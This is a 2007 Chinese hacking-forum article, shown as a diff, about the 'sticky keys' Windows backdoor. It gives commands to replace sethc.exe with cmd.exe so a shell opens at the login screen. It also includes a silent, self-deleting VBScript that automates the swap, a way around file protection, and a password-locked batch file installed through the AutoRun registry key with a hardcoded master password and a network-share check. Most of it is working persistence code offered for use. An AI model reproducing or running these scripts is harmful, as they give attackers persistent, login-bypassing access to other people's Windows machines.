@@ -1,0 +1,113 @@
+最酷的windows后门 呵呵
+
+创建时间：2007-08-24
+文章属性：整理
+文章提交：allyesno (allyesno_at_peoplemail.com.cn)
+
+后门原理：
+
+转至：小章 blog http://blog.csdn.net/scz123/archive/2007/03/14/1528695.aspx
+
+在windows 2000/xp/vista下，按shift键5次，可以打开粘置，会运行sethc.exe，而且，在登录界面里也可以打开。这就让人联想到WINDOWS的屏保，将程序替换成cmd.exe后，就可以打开shell了。
+
+参考McafeeAvertLabs：
+http://feeds.feedburner.com/~r/McafeeAvertLabsBlog/~3/101149799/
+
+XP：
+将安装源光盘弹出（或将硬盘上的安装目录改名)
+cd %widnir%\system32\dllcache
+ren sethc.exe *.ex~
+cd %widnir%\system32
+copy /y cmd.exe sethc.exe
+
+VISTA：
+takeown /f c:\windows\system32\sethc.exe
+cacls c:\windows\system32\sethc.exe /G administrator:F
+然后按XP方法替换文件
+
+在登录界面按5此SHIFT，出来cmd shell，然后……
+
+后门扩展：
+
+转至：7j blog http://1v1.name/show-241-1.html#cm300
+
+再更新一下 
+Dim obj, success 
+Set obj = CreateObject("WScript.Shell") 
+success = obj.run("cmd /c takeown /f %SystemRoot%\system32\sethc.exe", 0, True) 
+success = obj.run("cmd /c echo y| cacls %SystemRoot%\system32\sethc.exe /G %USERNAME%:F", 0, True) 
+success = obj.run("cmd /c copy %SystemRoot%\system32\cmd.exe %SystemRoot%\system32\acmd.exe", 0, True) 
+success = obj.run("cmd /c copy %SystemRoot%\system32\sethc.exe %SystemRoot%\system32\asethc.exe", 0, True) 
+success = obj.run("cmd /c del %SystemRoot%\system32\sethc.exe", 0, True) 
+success = obj.run("cmd /c ren %SystemRoot%\system32\acmd.exe sethc.exe", 0, True) 
+
+第二句最有意思了.嘿嘿..自动应答....以前就遇到过类似的问题
+
+再更新.加个自删除,简化代码... 
+On Error Resume Next 
+Dim obj, success 
+Set obj = CreateObject("WScript.Shell") 
+success = obj.run("cmd /c takeown /f %SystemRoot%\system32\sethc.exe&echo y| cacls %SystemRoot%\system32\sethc.exe /G %USERNAME%:F&copy %SystemRoot%\system32\cmd.exe %SystemRoot%\system32\acmd.exe&copy %SystemRoot%\system32\sethc.exe %SystemRoot%\system32\asethc.exe&del %SystemRoot%\system32\sethc.exe&ren %SystemRoot%\system32\acmd.exe sethc.exe", 0, True) 
+CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptName)
+
+allyesno注：对付文件保护的办法还可以参照我的文章 cut wfp 's jj easily 
+
+https://www.xfocus.net/bbs/index.php?act=SE&f=2&t=58099&p=269293
+
+后门锁扩展：
+
+allyesno注：可以采用cmd 锁 来进行cmdshell的密码验证 嘿嘿。。。
+
+用下面的后门锁的方法是 把代码保存为bdlock.bat
+
+然后修改注册表位置即可
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor]
+"AutoRun"="bdlock.bat"
+
+@Echo Off
+title 后门登陆验证
+color a
+cls
+set temprandom=%RANDOM%
+echo 请输入验证码:%temprandom%
+set/p check=
+if "%check%"=="%temprandom%%temprandom%" goto passcheck
+if "%check%"=="%temprandom%" (
+rem 后门服务器验证
+rem 如果没有后门验证服务器请rem注释掉下一行代码
+if exist \192.168.8.8\backdoor$\pass goto passcheck
+)
+echo 验证失败
+pause
+exit
+:passcheck
+echo 验证成功
+If "%passcmdlock%"=="http://blog.csdn.net/freexploit/" Goto endx
+Set passcmdlock=http://blog.csdn.net/freexploit/
+:allyesno
+Set Errorlevel=>nul
+Echo 请输入验证密码？
+Set password=allyesno Is a pig>nul
+Set/p password=
+rem 万能密码
+if "%password%"=="allyesno is a sb" goto endx
+If %time:~1,1%==0 Set timechange=a
+If %time:~1,1%==1 Set timechange=b
+If %time:~1,1%==2 Set timechange=c
+If %time:~1,1%==3 Set timechange=d
+If %time:~1,1%==4 Set timechange=e
+If %time:~1,1%==5 Set timechange=f
+If %time:~1,1%==6 Set timechange=g
+If %time:~1,1%==7 Set timechange=h
+If %time:~1,1%==8 Set timechange=i
+If %time:~1,1%==9 Set timechange=j
+set/a sum=%time:~1,1%+%time:~1,1%
+Set password|findstr "^password=%timechange%%time:~1,1%%date:~8,2%%sum%$">nul 
+If "%errorlevel%"=="0" cls&Echo 口令正确&Goto End
+Echo 请联系瑞星客服咨询正确密码！&Goto allyesno
+:End
+Set password=>nul
+Set Errorlevel=>nul
+Echo 很好，很和谐！
+:endx 
